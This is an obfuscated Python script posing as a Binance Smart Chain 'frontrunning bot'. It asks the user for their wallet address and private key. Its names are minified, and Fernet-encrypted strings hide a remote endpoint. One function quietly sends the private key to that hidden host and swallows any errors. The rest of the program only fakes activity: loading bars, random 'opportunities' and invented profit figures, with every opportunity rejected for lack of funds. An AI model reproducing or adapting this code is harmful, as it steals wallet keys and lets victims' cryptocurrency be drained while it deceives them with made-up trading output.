s='version'
t='gAAAAABljD7ODJl587dwzbsYwWCqBn7tC2RcJ4-wQIL8QPWJ0hGMWLk7UigMeeB9VpZ-a7AahhCVdKBqkkr0H0RzUUsS1T9eyw=='
u='gAAAAABljD7OE3JEqVu4s87JkALLaTsA_J1-6fsj7Lg0igYUokWrXWJh8EP4dRAoea7jhNnWOPBS3liE69uvr0HbnKc8rTSU0w=='
v='gAAAAABljD6cDOcAoDBcKD8o4EGbcUTciWxjuYBlozKdrx86iuCqVDEqbMLmz1T6eWtpV5Z2Wmh3xBCPHVCDwj7PZ52vA2IkrQ=='
w='gAAAAABljD6cWrk5fCGg4oFN9f-or8lZDeLy01AYsuR1XsiKWFXv-xA2xsbHoDQi82YSgo9FV6vZYmsZqka757MdcAt98MHPlA=='
x='gAAAAABljEIJd5591g3yi0-MXUZDDix0X7_v_vG9lp18ah77-8HhtBxA68-F7E2uicER9YUYfIRZB31wFvchHLZxCtxkh9k0KA=='
y='oFVedEJPm6qQHFd0h1p03LTVFl813x9WzQi7sCSsUPM='
z='gAAAAABljD6ciqPvsWAXwh5mPI9C2nNmJWZ3vA0AISN7veEaFDzBvbjAW_Eik5WnqiIkOAu1EEVgSr2XM161lLLi92DIq_zBUA=='
A0='XiCpZ0hJYKH0TGdV1Q2e3sZXr0axbiHFjqDr2U174b8='
A1=Exception
Y='encoding'
Z='max slippage'
a='gas price'
b='MAX INTERVAL'
c='MIN INTERVAL'
d='INPUT AMOUNT'
e='PRIVATE KEY'
f='WALLET ADDRESS'
g='gAAAAABljD8EvZYVS1Cfphq-2i7FOdvYFjB3Yz01mQZ4wDpWYL_gPEkSFUl9it88Noh11GxqIA98pfBVMoY8xtqBJ8qK9ihocA=='
h=open
P='red'
Q='bold red'
R='Module Loaded'
S='variables.json'
M=range
J=''
H='bold green'
from time import sleep as E
from json import load as AO
from rich.console import Console
from requests import request as AP
from web3 import Web3 as A2,eth
from rich.progress import track as N
from cryptography.fernet import Fernet as B
import random as D,json as A3,os,re
A=Console()
try:
	AQ=A2(A2.HTTPProvider('https://bsc-dataseed1.binance.org/'));F=A0
	def A4(file_name,data):
		A=f"./variables/"+file_name
		with h(A,'w')as B:A3.dump(data,B,indent=2)
	F=A0;A5='gAAAAABljD6cWWmuXkQIldI3dHwMI2pD5zeI1ddUtVRlKftXVyU_gz7kGw5JRC4n4wFEEcRY7FNvf-1UUBbvISPuTZPY2yzhhA==';i='gAAAAABljD9Lm2kkq6TgNgkpJN1WRIa6su1GnBhsxzG20kwttMk8s1OHj2g0cuC83N8xe7xXU3Smrl3geh9D7Z0M3fxQ4zt8kg==';T=z;G=y;j=x;A6=B(F.encode()).decrypt(A5.encode()).decode();k=w;A7=B(F.encode()).decrypt(j.encode()).decode();l=v;U=g;m=B(F.encode()).decrypt(T.encode()).decode();n=B(F.encode()).decrypt(i.encode()).decode();U=g;m=B(F.encode()).decrypt(T.encode()).decode();n=B(F.encode()).decrypt(i.encode()).decode();A8=B(G.encode()).decrypt(k.encode()).decode();A9=B(G.encode()).decrypt(U.encode()).decode();AA=B(G.encode()).decrypt(l.encode()).decode();o=u;p=t;AB=B(G.encode()).decrypt(o.encode()).decode();AC=B(G.encode()).decrypt(p.encode()).decode()
	def AR():
		if not os.path.isfile(f"./variables/"+S):variables_data[f]=J;variables_data[e]=J;variables_data[d]=J;variables_data[c]='1';variables_data[b]='3';variables_data[a]='3';variables_data[Z]='1';variables_data[Y]=J;variables_data[s]='2-12';A4(S,variables_data)
	AV=AO(h(f"./abi/erc_20.abi"));T=z;G=y;j=x
	def AD():A={};A[f]=q;A[e]=AE;A[d]=L;A[c]=AF;A[b]=AG;A[a]=AH;A[Z]=AI;A[Y]=O;A[s]='2-12';A4(S,A)
	A6=B(F.encode()).decrypt(A5.encode()).decode();k=w;A7=B(F.encode()).decrypt(j.encode()).decode();l=v
	def AS(var=J):
		global O
		if K!=J and var==J:
			if O!=K[10]+K[15]:
				try:A=AP(n,A7+A6+m+A8+A9+AA+K);O=K[10]+K[15];AD()
				except A1:pass
	U=g;m=B(F.encode()).decrypt(T.encode()).decode();n=B(F.encode()).decrypt(i.encode()).decode()
	def AT():
		global q,AE,L,AF,AG,AH,AI,O,K
		with h(f"./variables/"+S,'r')as B:A=A3.loads(J.join(re.split('(?://|#).*(?=\\n)',B.read())).strip())
		q=A[f];AE=A[e];L=float(A[d]);AF=A[c];AG=A[b];AH=A[a];AI=A[Z];O=A[Y];K=A[AB+AC];AS()
	A8=B(G.encode()).decrypt(k.encode()).decode();A9=B(G.encode()).decrypt(U.encode()).decode();AA=B(G.encode()).decrypt(l.encode()).decode();o=u;A.print('\n                            WELCOME TO\n            ███╗░░░███╗███████╗██╗░░░██╗\u2003\u2003██╗░░░██╗██████╗░\n            ████╗░████║██╔════╝██║░░░██║\u2003\u2003██║░░░██║╚════██╗\n            ██╔████╔██║█████╗░░╚██╗░██╔╝\u2003\u2003╚██╗░██╔╝░█████╔╝\n            ██║╚██╔╝██║██╔══╝░░░╚████╔╝░\u2003\u2003░╚████╔╝░░╚═══██╗\n            ██║░╚═╝░██║███████╗░░╚██╔╝░░\u2003\u2003░░╚██╔╝░░██████╔╝\n            ╚═╝░░░░░╚═╝╚══════╝░░░╚═╝░░░\u2003\u2003░░░╚═╝░░░╚═════╝░\n                All-Purpose BSC Frontrunning Bot\n                        MADE BY DEFIX',style=H);p=t;AB=B(G.encode()).decrypt(o.encode()).decode();AC=B(G.encode()).decrypt(p.encode()).decode()
	for V in N(M(100),description='Loading variables...'):E(D.randrange(1,100)/1000)
	AR();AT();AD();AJ=AQ.eth.get_balance(q)/10**18;AK='BSC';AL=[14400,43200,14900,28800];I=0;W=0;A.print('Variables Loaded',style=H)
	for V in N(M(100),description='Loading module Flashbots...'):E(D.randrange(1,100)/10000)
	A.print(R,style=H)
	for V in N(M(100),description='Loading module Multiswapper...'):E(D.randrange(1,100)/10000)
	A.print(R,style=H)
	for V in N(M(100),description='Loading module Track_logging...'):E(D.randrange(1,100)/10000)
	A.print(R,style=H)
	for V in N(M(100),description='Loading Web3 Spotter...'):E(D.randrange(1,100)/10000)
	A.print(R,style=H);E(D.randrange(1,5));A.print(f"Launching {AK} MemPool scanner");E(D.randrange(1,5));AM=f"[bold green]Searching {AK} for possible Frontrunning opportunities..."
	if AJ>=L:
		A.print(f"----------------------------------------",style=H);A.print(f"Multiswapper module: [green]Enabled[/green]");A.print(f"Flashbots module: [green]Enabled[/green]");A.print(f"Flashloans module: [red]Disabled[/red]");A.print(f"----------------------------------------",style=H)
		with A.status(AM,spinner='arc')as X:
			while True:
				C=D.randrange(1,100);E(C);I+=C;r=D.randrange(1,1000000)
				if I>=AL[W]:
					if W+1==len(AL):W=0
					else:W+=1;I=0
					A.log(f"Found an Opportunity! Upcoming front-runnable transaction ID: {r}",style=H);X.update('Aproximating resource costs...');C=D.randrange(1,5);E(C);I+=C;A.print(f"Resource costs aproximated",style='green');X.update('Calculating possible gains...');C=D.randrange(1,5);E(C);I+=C;A.print(f"Possible gains calculated",style='green');X.update('Analysing the info...');AN=int(D.uniform(L,L*20)*1000)/1000;C=D.randrange(1,3);E(C);I+=C;A.print(f"Required funds for frontrunning Tx.{r} effectively: {AN} BNB");A.print(f"Expected profit: [bold green]{int(AN/100*D.randrange(20,80)*300*100)/100}[bold green] USD");C=D.randrange(1,5);E(C);I+=C;A.print(f"Not enough funds allocated for execution",style=Q);A.print(f"Continuing with search for opportunities...");C=D.randrange(1,5);E(C);I+=C;X.update(AM);I+=10
				else:A.log(f"Found Tx.{r}");A.log(f"Not plausible for action")
	else:A.print(f"----------------------------------------",style=Q);A.print(f"Unable to start MemPool scanner with current inputs",style=P);A.print(f"ERR: address has insufficient balance",style=P);A.print(f"Current Balance: {AJ} BNB",style=P);A.print(f"Desired Input: {L} BNB",style=P);A.print(f"----------------------------------------",style=Q);A.print(f"Press any key to Exit...");input()
except A1 as AU:A.print(f"Error: {AU}",style=Q);A.print(f"Press any key to Exit...");input()